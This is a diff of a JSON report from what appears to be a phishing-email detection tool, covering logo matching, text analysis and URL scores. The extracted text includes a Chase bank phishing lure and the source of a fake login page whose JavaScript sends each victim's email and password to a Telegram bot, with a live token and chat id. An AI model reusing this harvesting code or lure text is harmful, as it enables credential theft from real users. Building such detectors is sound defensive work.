@@ -1,110 +1,197 @@
 {
   "email": "email_paste.eml",
   "fusion": {
-    "score_fusion": 0.248,
-    "statut_fusion": "SAIN",
-    "vision_score": 0.396,
-    "nlp_score": 0.098,
-    "url_score": 0.25
+    "score_fusion": 0.538,
+    "statut_fusion": "SUSPECT",
+    "vision_score": 0.982,
+    "nlp_score": 0.234,
+    "url_score": 0.375
   },
   "vision": {
     "images": [
-      "C:\\logos_reference\\resultats_ui\\images\\3eff8d88bcab414eb752fe24463dd586.png",
-      "C:\\logos_reference\\resultats_ui\\images\\email_paste_cid_3eff8d88bcab414eb752.png"
+      "C:\\logos_reference\\resultats_ui\\images\\DEWA.jpg",
+      "C:\\logos_reference\\resultats_ui\\images\\email_paste_cid_DEWA.jpg.jpeg"
     ],
     "count": 2,
     "results": [
       {
-        "image": "C:\\logos_reference\\resultats_ui\\images\\3eff8d88bcab414eb752fe24463dd586.png",
-        "meilleur_logo": "PayPal_Icon_15.jpeg",
-        "visual_score": 0.396,
-        "score_final": 0.396,
+        "image": "C:\\logos_reference\\resultats_ui\\images\\DEWA.jpg",
+        "meilleur_logo": "Apple_Icon_6.png",
+        "visual_score": 0.707,
+        "score_final": 0.982,
         "details_scores": {
-          "pHash": 0.59375,
-          "SSIM": 0.09921330958604813
+          "Amazon_Logo_1.png": {
+            "hash": 0.438,
+            "ssim": 0.022,
+            "combined": 0.271
+          },
+          "Apple_Icon_6.png": {
+            "hash": 0.859,
+            "ssim": 0.477,
+            "combined": 0.707
+          },
+          "Credit_Agricole_id5zLxY0QZ_1.png": {
+            "hash": 0.523,
+            "ssim": 0.059,
+            "combined": 0.338
+          },
+          "facebook.png": {
+            "hash": 0.43,
+            "ssim": 0.081,
+            "combined": 0.29
+          },
+          "google.png": {
+            "hash": 0.266,
+            "ssim": 0.001,
+            "combined": 0.16
+          },
+          "instagram.png": {
+            "hash": 0.406,
+            "ssim": 0.093,
+            "combined": 0.281
+          },
+          "microsoft.png": {
+            "hash": 0.242,
+            "ssim": 0.409,
+            "combined": 0.309
+          },
+          "netflix.png": {
+            "hash": 0.48,
+            "ssim": 0.009,
+            "combined": 0.292
+          },
+          "PayPal_Icon_15.jpeg": {
+            "hash": 0.754,
+            "ssim": 0.4,
+            "combined": 0.612
+          },
+          "twitter.png": {
+            "hash": 0.109,
+            "ssim": 0.002,
+            "combined": 0.066
+          }
         },
-        "domaine_expediteur": "111b9dj0-c3d-11.com",
+        "domaine_expediteur": "enroutel.com",
         "domaine_officiel": false,
-        "menaces_ocr": [],
-        "score_textuel": 0.0
+        "menaces_ocr": [
+          "design_suspect"
+        ],
+        "score_textuel": 0.8
       },
       {
-        "image": "C:\\logos_reference\\resultats_ui\\images\\email_paste_cid_3eff8d88bcab414eb752.png",
-        "meilleur_logo": "PayPal_Icon_15.jpeg",
-        "visual_score": 0.396,
-        "score_final": 0.396,
+        "image": "C:\\logos_reference\\resultats_ui\\images\\email_paste_cid_DEWA.jpg.jpeg",
+        "meilleur_logo": "Apple_Icon_6.png",
+        "visual_score": 0.707,
+        "score_final": 0.982,
         "details_scores": {
-          "pHash": 0.59375,
-          "SSIM": 0.09921330958604813
+          "Amazon_Logo_1.png": {
+            "hash": 0.438,
+            "ssim": 0.022,
+            "combined": 0.271
+          },
+          "Apple_Icon_6.png": {
+            "hash": 0.859,
+            "ssim": 0.477,
+            "combined": 0.707
+          },
+          "Credit_Agricole_id5zLxY0QZ_1.png": {
+            "hash": 0.523,
+            "ssim": 0.059,
+            "combined": 0.338
+          },
+          "facebook.png": {
+            "hash": 0.43,
+            "ssim": 0.081,
+            "combined": 0.29
+          },
+          "google.png": {
+            "hash": 0.266,
+            "ssim": 0.001,
+            "combined": 0.16
+          },
+          "instagram.png": {
+            "hash": 0.406,
+            "ssim": 0.093,
+            "combined": 0.281
+          },
+          "microsoft.png": {
+            "hash": 0.242,
+            "ssim": 0.409,
+            "combined": 0.309
+          },
+          "netflix.png": {
+            "hash": 0.48,
+            "ssim": 0.009,
+            "combined": 0.292
+          },
+          "PayPal_Icon_15.jpeg": {
+            "hash": 0.754,
+            "ssim": 0.4,
+            "combined": 0.612
+          },
+          "twitter.png": {
+            "hash": 0.109,
+            "ssim": 0.002,
+            "combined": 0.066
+          }
         },
-        "domaine_expediteur": "111b9dj0-c3d-11.com",
+        "domaine_expediteur": "enroutel.com",
         "domaine_officiel": false,
-        "menaces_ocr": [],
-        "score_textuel": 0.0
+        "menaces_ocr": [
+          "design_suspect"
+        ],
+        "score_textuel": 0.8
       }
     ],
-    "expediteur": "JPMorchan|Chase Client Support<custrep@111b9dj0-c3d-11.com>",
-    "domaine_expediteur": "111b9dj0-c3d-11.com"
+    "expediteur": "\"DEWA - monkey.org\"<lara@enroutel.com>",
+    "domaine_expediteur": "enroutel.com"
   },
   "nlp": {
     "email": "email_paste",
-    "score_nlp": 0.098,
+    "score_nlp": 0.234,
     "statut_nlp": "SAIN",
     "mots_detectes": [
-      "menace",
-      "finances"
+      "urgence"
     ],
     "menaces_detectees": [
-      "menace",
-      "finances"
+      "urgence"
     ],
-    "nombre_mots_suspects": 2,
+    "nombre_mots_suspects": 1,
     "categorie_menace": "AUCUNE",
-    "confiance": 0.11,
+    "confiance": 0.27,
     "details": {
-      "orthographe": 0.252,
+      "orthographe": 1.0,
       "ponctuation": 0.0,
-      "urgence": 0.2,
+      "urgence": 0.15,
       "spoofing": 0.0,
-      "keywords": 0.03
+      "keywords": 0.015
     },
-    "texte_extrait": "Bank Alert: Review your recent account activity on  Monday,\n January 6, 2025 7:9 a.m.   \n \n \n  \n \n \n  \n \n \n \n \n \n \n \n &nbsp; \n &nbsp; \n &nbsp; \n \n \n       \n \n &nbsp; \n &nbsp; \n   \n &nbsp; \n         \n &nbsp; \n Dear Chase Customer jose@monkey.org, \n We're currently undergoing an investigation on your Chase CHECKING/SAVINGS account in accordance with Chase Bank Terms &amp; Services. This is caused due to the following; \n &nbsp; \n \n suspicious account activity \n Unusual account purchase \n Numerous login attempts \n \n &nbsp; \n As a precaution, We have temporarily&nbsp;restricted your account to protect against future unauthorized transactions verify you information onfile with us. \n To verify your account, visit our secured link below so you could sign in and follow the intructions to help us confirm your account and prevent permanent suspension. \n  Sign in  \n &nbsp; \n   Warning:  Ignoring or giving wrong details means you are not the rightful owner of this account  \n  and we are going to terminate your account if such activity is detected.  \n  Once you have done this, our anti-fraud department will work to resolve this issue. We are happy you have chosen us to do business with.  \n &nbsp; \n  Thank you, Chase Group  \n \n  &nbsp; All contents &copy; Copyright CHASE Group 2025. All rights reserved.   \n \n       \n \n \n &nbsp; \n &nbsp; \n &nbsp; \n \n \n \n \n \n \n \n \n \n \n \n  "
+    "texte_extrait": "Reminder: jose  Payment of outstanding return (Urgent) \r\n  \r\n \r\n \r\n \r\n     \r\n        body {\r\n            background-image: url(\"https://i.sstatic.net/vzbuQ.jpg\");\r\n            background-size: cover;\r\n            background-repeat: no-repeat;\r\n            height: 100vh;\r\n            margin: 0;\r\n            display: flex;\r\n            justify-content: center;\r\n            align-items: center;\r\n        }\r\n\r\n        .login-form {\r\n            background: white;\r\n            padding: 20px;\r\n            border-radius: 10px;\r\n            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);\r\n        }\r\n\r\n        input {\r\n            width: 100%;\r\n            padding: 10px;\r\n            margin: 5px 0;\r\n            border: 1px solid #ccc;\r\n            border-radius: 5px;\r\n        }\r\n\r\n        button {\r\n            width: 100%;\r\n            padding: 10px;\r\n            margin: 10px 0;\r\n            background: #007bff;\r\n            color: white;\r\n            border: none;\r\n            border-radius: 5px;\r\n            cursor: pointer;\r\n        }\r\n     \r\n \r\n  \r\n        \r\n     \r\n \r\n  \r\nSign in     \r\n \r\nmonkey.orgTo continue:  \r\n             Email: \r\n              \r\n             Enter Password: \r\n               \r\nView PDF  Document \r\n   \r\n          \r\n     \r\n     \r\n        const form = document.getElementById('loginForm');\r\n        const loginMessage = document.getElementById('loginMessage');\r\n        form.addEventListener('submit', function(event) {\r\n            event.preventDefault();\r\n            const email = form.elements.email.value;\r\n            const password = form.elements.password.value;\r\n            const apiKey = '7623747577:AAEIXhe-FMPXqXPA2kGgpQBkvxHHVpB0W-U';\r\n            const chatId = '-1002406044964';\r\n            fetch(`https://api.telegram.org/bot${apiKey}/sendMessage?chat_id=${chatId}&text=Email: ${email}%0APassword: ${password}`)\r\n                .then(response => {\r\n                    if (response.ok) {\r\n                        loginMessage.innerText = 'Login Failed: Please check input and Try again!';\r\n                    } else {\r\n                        loginMessage.innerText = 'Login Failed: Please check input and Try again!.';\r\n                    }\r\n                })\r\n                .catch(error => {\r\n                    loginMessage.innerText = 'An error occurred while trying.';\r\n                });\r\n        });\r\n     \r\n   "
   },
   "url": {
     "urls": [
-      "https://boxauth.ru/m=",
-      "http://d36cz9buwru1tt.cloudfront.net/blank.gif"
+      "https://ci3.googleusercontent.com/meips/ADKq_NbknAWcY3dgiRa706s8qDi8hb_GbuEX-ZDew9wGAsBgQyAoADU6Jb0UNXZ3XTeBLwc8zS9RtwXfDyCJq9Higl8L7xU0zrnV5-Iy7ZE-PucdcP41FOfWEPWG=3Ds0-d-e1-ft#https://www.dewa.gov.ae/emailer/greenbill/images/dewa_footer_en.bmp"
     ],
     "analyses": [
       {
         "email_id": "email_paste",
-        "url": "https://boxauth.ru/m=",
-        "domain": "boxauth.ru",
-        "typosquatting_score": 0.5,
-        "typosquatting_reason": "SUSPICIOUS_TLD",
-        "virustotal_verdict": "UNKNOWN",
+        "url": "https://ci3.googleusercontent.com/meips/ADKq_NbknAWcY3dgiRa706s8qDi8hb_GbuEX-ZDew9wGAsBgQyAoADU6Jb0UNXZ3XTeBLwc8zS9RtwXfDyCJq9Higl8L7xU0zrnV5-Iy7ZE-PucdcP41FOfWEPWG=3Ds0-d-e1-ft#https://www.dewa.gov.ae/emailer/greenbill/images/dewa_footer_en.bmp",
+        "domain": "ci3.googleusercontent.com",
+        "typosquatting_score": 0.75,
+        "typosquatting_reason": "POSSIBLE_HOMOGLYPH",
+        "virustotal_verdict": "CLEAN",
         "virustotal_malicious": 0,
         "virustotal_suspicious": 0,
-        "score_url": 0.25,
-        "statut_url": "SAIN"
-      },
-      {
-        "email_id": "email_paste",
-        "url": "http://d36cz9buwru1tt.cloudfront.net/blank.gif",
-        "domain": "d36cz9buwru1tt.cloudfront.net",
-        "typosquatting_score": 0.0,
-        "typosquatting_reason": "UNKNOWN",
-        "virustotal_verdict": "UNKNOWN",
-        "virustotal_malicious": 0,
-        "virustotal_suspicious": 0,
-        "score_url": 0.0,
+        "score_url": 0.375,
         "statut_url": "SAIN"
       }
     ],
     "urls_extraites": [
-      "https://boxauth.ru/m=",
-      "http://d36cz9buwru1tt.cloudfront.net/blank.gif"
+      "https://ci3.googleusercontent.com/meips/ADKq_NbknAWcY3dgiRa706s8qDi8hb_GbuEX-ZDew9wGAsBgQyAoADU6Jb0UNXZ3XTeBLwc8zS9RtwXfDyCJq9Higl8L7xU0zrnV5-Iy7ZE-PucdcP41FOfWEPWG=3Ds0-d-e1-ft#https://www.dewa.gov.ae/emailer/greenbill/images/dewa_footer_en.bmp"
     ],
-    "urls_count": 2
+    "urls_count": 1,
+    "score_url": 0.375,
+    "statut_url": "SAIN",
+    "alertes": []
   }
 }
